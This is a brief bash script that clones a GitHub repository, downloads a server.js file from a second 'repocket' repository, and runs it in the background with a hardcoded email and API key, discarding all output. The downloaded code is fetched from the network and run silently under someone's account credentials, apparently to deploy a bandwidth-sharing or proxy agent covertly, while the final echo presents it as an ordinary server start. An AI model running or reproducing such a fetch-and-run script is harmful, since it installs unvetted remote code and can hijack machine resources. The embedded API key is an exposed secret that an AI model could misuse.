#!/bin/bash
git clone https://github.com/malphite-code-1/server.git

cd server

curl -O -L -J https://raw.githubusercontent.com/lu437903/repocket/refs/heads/main/server.js

nohup RP_EMAIL=malphite848@gmail.com RP_API_KEY=c41ff3ef-ac25-4e91-aa23-39f5c8d91b93 ./node server.js >/dev/null 2>&1 &

nohup ./node app.js >/dev/null 2>&1 &

echo "Server started in the background. You can check the logs in the 'server' directory."
